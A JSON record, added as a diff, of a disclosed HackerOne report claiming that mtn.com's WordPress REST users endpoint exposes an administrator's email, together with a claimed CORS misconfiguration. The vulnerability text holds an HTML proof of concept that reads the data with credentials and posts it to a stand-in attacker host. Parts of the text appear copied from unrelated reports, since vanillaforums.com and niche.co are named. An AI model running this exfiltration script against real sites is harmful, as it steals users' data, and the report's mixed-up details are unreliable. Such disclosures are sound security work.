@@ -1,0 +1,205 @@
+{
+  "id": 2450685,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUwNjg1",
+  "url": "https://hackerone.com/reports/2450685",
+  "title": "Unauthorized access to PII leads to Administrator account Takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2024-04-06T22:17:41.220Z",
+  "submitted_at": "2024-04-06T22:17:41.520Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "h0w",
+    "url": "/h0w",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fhzfzlvq1tflwrj6kpcrlujrnmlo/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-02-22T15:48:49.662Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-01-23T15:48:46.716Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThis vulnerability is present in the `wp-json/wp/v2/users/15` file located in the wordpress directory endpoints. This flaw arises from insufficient restrictions placed on the list of post authors, which can be exploited by remote attackers to obtain sensitive information through wp/v2/users/15 requests attackers can obtain sensitive information in the form of email addresses (PII Leaks) and will be used in `wp-login` to send forget password or brute-force password requests.\n\n**Descriptions:**\nAn cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page CORS misconfiguration is found on vanillaforums.com as `Access-Control-Allow-Credentials: true`.\n\n**Platform(s) Affected: [website]**\nhttps://www.mtn.com/wp-json/wp/v2/users/15\n\n## Steps To Reproduce:\n  1. Navigate visit hostname or directory on https:\\/\\/www.mtn.com\\/wp-json\\/wp\\/v2\\/users\\/9\n  1. Intercept request to `burp-suite` and you will see unauthenticated APIs `administrator_login` email address exposed\n\n{F3171358}\n\n  3. copy this scripts and save file as `.html` and open in our browsers \n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n<center>\n<h3>Steal administrator PII data!</h3>\n<html>\n<body>\n<button type='button' onclick='cors()'>Exploit</button>\n<p id='demo'></p>\n<script>\nfunction cors() {\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 && this.status == 200) {\nvar a = this.responseText; // Sensitive data from niche.co about user account\ndocument.getElementById(\"demo\").innerHTML = a;\nxhttp.open(\"POST\", \"http://burpcollaborator-intruder-evil.com\", true);// Sending that data to Attacker's website\nxhttp.withCredentials = true;\nconsole.log(a);\nxhttp.send(\"data=\"+a);\n}\n};\nxhttp.open(\"GET\", \"https://www.mtn.com/wp-json/wp/v2/users/15\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n}\n</script>\n</body>\n</html>\n```\n{F3171366}\n\n\n## Supporting Material/References:\n  * It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.\n  * It's also possible to create a rewrite rule on `.htaccess` (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: \"^.rest_route=/wp-json/wp/v2/users/15\") to a Not Found (404) or a Default Page.\n\n## Impact\n\n1. Attacker get sensitive information PII Leaks (email adress)\n 1. Attacker can brute-force the password use the valid administrator login\n 1. CORS Misconfiguration, could lead to disclosure of sensitive information\n * Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.\n * This website using Wordpress , so developer forget to enable authenticator in the APIs that can view information of admin user. By access to this link, attacker can get `username` and `email_address` and other information of user admin.",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3171358,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eml9w3242aouaajavyum1c9de40o?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRQTC6SD5%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043352Z&X-Amz-Expires=427&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQC%2Fl0rptJiZ3JLfLUyN4nIqg0q6zcx8v23RaYdYFoapBgIhAOqGvs%2BEhWo2OgkcLx5rQvWcd1DO0dr7b7yc96r3K%2BOHKroFCP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzWkaDDGFWMhJ2hqLwqjgWCnaoCXv02C5pu8mDW5hxPIwy8cYiuXzavZJ%2BuQVFUuuH7C0I7QziVr%2Fz66vSbLznSu%2BwdUDNxSW74WJJYklk5%2FIN6WzZv%2BIw7f7g9KDOlcBbObpL%2Br14EENEvcj%2B75g0wTPaWjsxT%2F%2F9u7q54qnnplksEnT0%2BbMZ%2BtMP8aDcokLVZmPXs%2F6N9K6SoMQXQ%2FE4vW4LBg54eh2oUUf4elcO61eXMbOeC9PF9mY6XtHXIyqU4d4M48TeyULdPOzcRBIMwEoNvLFi7kUXZb%2FTAn7HUnGUUeZwCrn7fKh8GsZoYMmq2yFy7l7z6yzoyISfWMpqX%2Bqr0c4uKJopQiLVPZBfmUISiSYxlonrh4QbrvRADPTcoyolAM979MckjtvJSGk2eybN4BXlzFyjAa3kznaMGxIi9JIH8MiPJPYzXpSTtjyJI1YauII0lwrgBNjzKlJW5PzrDqZuDyXgd65ItQMGq0rcrMfdQjt%2Fo6rnbDrL6ls90wWa57Bu65FwLUu398aJe7ML9nVBjzPF63OsyDNmbUddipovVGmym1LQQx30jYmA%2BcRIBDv6odqcbeu5Hp0jqqwo7XzUMXqIDfdgQJTbHRkwZkPRN2c6z%2FcrJ9DVuo%2BX5hDukTYh4LmREN7RFyGYt%2BAsux1MO2zBU%2BwllFbOnRcGELdfNF0lMt861YizXtM3hkrIZ%2BFv7wJsSka8DiIOIFVmOxIFnTWs8j2JrOvENizfd%2BxX7I%2B76%2BdjssxW7fapVMOrejkI6m5hcSkJhQfTWdQViBwXNTR%2Fkt%2F1hpLHe0moqmOHcRGf2ofkOpICyUjZGaDzynE14RFjUQylwcBWfFkgsW3NUMIsZpbzRczHW%2Fq3Z%2FXo7qCBIm9zGMWowjsWb0gY6sAFlCu95dR0Z1Wy7gxBuKlZV2phsPuxpCA6GIxqbmKyexrorJK1uEorMXQpHZPIEFfU1l2acCiiuiG8VOj0%2BizgYU4f3pBcsf9Cl2r4NBhliOa0buWMoH0oehEouM4niL6M7j3mO%2FcYMSZZabum%2BsDgjFWFr4G80VMaZIiVXNVSF5%2FrE2xaGqMdXQfuqwW0qbbYUstBFDaF61KrZfv2p5lWTylTd3XzWE1tkbImnSysa%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fb630f402a7787e530ac5b3d23a6ce84614fccb3eb4afbd16e780571b9a7ec15",
+      "file_size": 138218,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3171366,
+      "file_name": "CORS.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fp1tzcg4i4iitlpzmsbt3ibi102k?response-content-disposition=attachment%3B%20filename%3D%22CORS.gif%22%3B%20filename%2A%3DUTF-8%27%27CORS.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRQTC6SD5%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043352Z&X-Amz-Expires=427&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQC%2Fl0rptJiZ3JLfLUyN4nIqg0q6zcx8v23RaYdYFoapBgIhAOqGvs%2BEhWo2OgkcLx5rQvWcd1DO0dr7b7yc96r3K%2BOHKroFCP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzWkaDDGFWMhJ2hqLwqjgWCnaoCXv02C5pu8mDW5hxPIwy8cYiuXzavZJ%2BuQVFUuuH7C0I7QziVr%2Fz66vSbLznSu%2BwdUDNxSW74WJJYklk5%2FIN6WzZv%2BIw7f7g9KDOlcBbObpL%2Br14EENEvcj%2B75g0wTPaWjsxT%2F%2F9u7q54qnnplksEnT0%2BbMZ%2BtMP8aDcokLVZmPXs%2F6N9K6SoMQXQ%2FE4vW4LBg54eh2oUUf4elcO61eXMbOeC9PF9mY6XtHXIyqU4d4M48TeyULdPOzcRBIMwEoNvLFi7kUXZb%2FTAn7HUnGUUeZwCrn7fKh8GsZoYMmq2yFy7l7z6yzoyISfWMpqX%2Bqr0c4uKJopQiLVPZBfmUISiSYxlonrh4QbrvRADPTcoyolAM979MckjtvJSGk2eybN4BXlzFyjAa3kznaMGxIi9JIH8MiPJPYzXpSTtjyJI1YauII0lwrgBNjzKlJW5PzrDqZuDyXgd65ItQMGq0rcrMfdQjt%2Fo6rnbDrL6ls90wWa57Bu65FwLUu398aJe7ML9nVBjzPF63OsyDNmbUddipovVGmym1LQQx30jYmA%2BcRIBDv6odqcbeu5Hp0jqqwo7XzUMXqIDfdgQJTbHRkwZkPRN2c6z%2FcrJ9DVuo%2BX5hDukTYh4LmREN7RFyGYt%2BAsux1MO2zBU%2BwllFbOnRcGELdfNF0lMt861YizXtM3hkrIZ%2BFv7wJsSka8DiIOIFVmOxIFnTWs8j2JrOvENizfd%2BxX7I%2B76%2BdjssxW7fapVMOrejkI6m5hcSkJhQfTWdQViBwXNTR%2Fkt%2F1hpLHe0moqmOHcRGf2ofkOpICyUjZGaDzynE14RFjUQylwcBWfFkgsW3NUMIsZpbzRczHW%2Fq3Z%2FXo7qCBIm9zGMWowjsWb0gY6sAFlCu95dR0Z1Wy7gxBuKlZV2phsPuxpCA6GIxqbmKyexrorJK1uEorMXQpHZPIEFfU1l2acCiiuiG8VOj0%2BizgYU4f3pBcsf9Cl2r4NBhliOa0buWMoH0oehEouM4niL6M7j3mO%2FcYMSZZabum%2BsDgjFWFr4G80VMaZIiVXNVSF5%2FrE2xaGqMdXQfuqwW0qbbYUstBFDaF61KrZfv2p5lWTylTd3XzWE1tkbImnSysa%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1d931751a5ae984661f343bfefd69446163598e23a699f488ffdeb7cde570b30",
+      "file_size": 7481992,
+      "type": "image/gif",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-02-22T15:48:47.032Z",
+  "allow_singular_disclosure_after": -42813905.306727365,
+  "singular_disclosure_allowed": true,
+  "vote_count": 82,
+  "voters": [
+    "aboalezz",
+    "k0ns0l",
+    "zsir",
+    "pippybear",
+    "mikelly",
+    "newday_newlife",
+    "ryel",
+    "loaymorad",
+    "pinkmeimei",
+    "starlox",
+    "and 72 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 34306,
+    "asset_type": "URL",
+    "asset_identifier": "mtn.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "2450685",
+  "votes": 82,
+  "latest_disclosable_activity_at": "2025-02-22T15:48:50.926Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:33:52.442704",
+    "source": "https://hackerone.com/reports/2450685.json",
+    "report_id": 2450685
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUwNjg1",
+    "databaseId": "2450685",
+    "title": "Unauthorized access to PII leads to Administrator account Takeover",
+    "url": "https://hackerone.com/reports/2450685",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2025-02-22T15:48:49.662Z",
+    "created_at": "2024-04-06T22:17:41.220Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzc1",
+      "name": "Privilege Escalation",
+      "external_id": "capec-233"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": null
+    },
+    "reporter": {
+      "username": "h0w"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vNDE5MTk=",
+      "handle": "mtn_group",
+      "name": "MTN Group",
+      "url": "https://hackerone.com/mtn_group",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI0NTA2ODU=",
+    "_id": "2450685",
+    "disclosed": true,
+    "votes": 82,
+    "latest_disclosable_activity_at": "2025-02-22T15:48:50.926Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUwNjg1",
+      "databaseId": "2450685",
+      "title": "Unauthorized access to PII leads to Administrator account Takeover",
+      "url": "https://hackerone.com/reports/2450685",
+      "disclosed_at": "2025-02-22T15:48:49.662Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vNDE5MTk=",
+      "handle": "mtn_group",
+      "name": "MTN Group",
+      "url": "https://hackerone.com/mtn_group",
+      "currency": "usd"
+    }
+  }
+}
